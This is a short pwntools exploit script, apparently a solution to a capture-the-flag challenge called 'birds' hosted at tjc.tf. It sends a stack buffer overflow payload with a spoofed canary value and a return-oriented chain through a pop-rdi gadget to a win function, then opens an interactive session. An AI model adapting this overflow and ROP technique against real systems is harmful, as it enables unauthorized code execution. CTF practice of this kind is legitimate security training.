from pwn import *
#p=process("./birds")
p=remote("tjc.tf",31625)
canary=0xDEADBEEF
save_rbp=0
pop_rdi_rbp=0x00000000004011c0
win_addr=0x4011c4
payload=b'a'*76+p32(0xDEADBEEF)+p64(0)+p64(0x00000000004011c0)+p64(0xA1B2C3D4)+p64(0)+p64(0x4011c4)
#input()
p.sendlineafter(b'wrong!\n',payload)
p.interactive()
